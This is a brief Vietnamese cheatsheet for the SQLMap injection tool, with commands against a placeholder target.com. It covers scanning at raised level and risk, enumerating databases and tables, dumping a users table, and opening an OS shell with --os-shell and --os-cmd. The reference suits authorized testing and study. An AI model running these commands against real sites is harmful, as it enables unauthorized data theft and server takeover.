# SQLMap Quick Reference & Cheatsheet

> Bảng tra cứu nhanh các câu lệnh và tham số quan trọng nhất của SQLMap.

---

## 1. Các Kỹ Thuật SQLi (`--technique=BEUSTQ`)
* `B`: **Boolean-based blind** - So sánh True/False, tốn ~7-8 requests/ký tự.
* `E`: **Error-based** - Trích xuất dữ liệu qua thông báo lỗi (nhanh thứ 2).
* `U`: **UNION query-based** - Kéo toàn bộ bảng chỉ với 1 request (**nhanh nhất**).
* `S`: **Stacked queries** - Tiêm câu lệnh thứ 2 (chạy `DROP`, `INSERT`, `xp_cmdshell`).
* `T`: **Time-based blind** - Dựa vào hàm trễ (`SLEEP`), chậm nhất.
* `Q`: **Inline queries** - Nhúng câu query con vào trong câu query cha.

---

## 2. Các Lệnh Cơ Bản
```bash
# Kiểm tra điểm tiêm từ URL
sqlmap -u "http://target.com/page.php?id=1" --batch

# Kiểm tra từ file HTTP Request lưu từ Burp Suite
sqlmap -r request.txt --batch

# Chỉ định mức độ kiểm tra sâu và rủi ro (Mặc định: level 1, risk 1)
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3
```

---

## 3. Thu Thập Dữ Liệu (Enumeration)
```bash
# Liệt kê danh sách database
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Liệt kê danh sách bảng của database 'target_db'
sqlmap -u "http://target.com/page.php?id=1" -D target_db --tables

# Liệt kê danh sách cột của bảng 'users'
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users --columns

# Trích xuất toàn bộ dữ liệu bảng 'users'
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users --dump
```

---

## 4. Chiếm Quyền Hệ Điều Hành (OS Takeover)
```bash
# Mở shell thực thi lệnh tương tác
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# Thực thi một lệnh duy nhất
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami"
```

---
*Edit by me and AI.*
